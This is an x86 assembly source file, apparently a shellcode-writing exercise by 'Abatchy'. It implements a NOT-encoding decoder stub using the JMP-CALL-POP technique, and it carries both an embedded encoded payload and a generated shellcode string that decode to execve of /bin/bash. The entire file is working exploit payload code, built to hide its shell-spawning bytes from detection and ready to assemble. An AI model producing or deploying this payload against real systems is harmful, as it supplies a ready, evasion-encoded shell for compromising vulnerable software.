; NOTExecveBashStack.asm
; by Abatchy
;
;   nasm -felf32 NOTExecveBashStack.asm && ld -o NOTExecveBashStack NOTExecveBashStack.o
; Generated shellcode: "\xeb\x0c\x5e\x8a\x06\xf6\x16\xfe\xc0\x74\x08\x46\xeb\xf5\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\x9d\x9e\x8c\x97\x97\x9d\x96\x91\xd0\x97\xd0\xd0\xd0\xd0\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f\xff"

global _start

section .text

_start:
    
    jmp short get_shellcode_addr

ReturnLabel:
    pop esi

decode:
    mov al, byte [esi]
    not byte [esi]
    inc al          ; Added 0xff at the end to mark end of the shellcode
    jz shellcode
    inc esi
    jmp short decode

get_shellcode_addr:
    call ReturnLabel
    shellcode: db  0xce, 0x3f, 0xaf, 0x97, 0x9d, 0x9e, 0x8c, 0x97, 0x97, 0x9d, 0x96, 0x91, 0xd0, 0x97, 0xd0, 0xd0, 0xd0, 0xd0, 0x76, 0x1c, 0xaf, 0x76, 0x1d, 0xac, 0x76, 0x1e, 0x4f, 0xf4, 0x32, 0x7f, 0xff
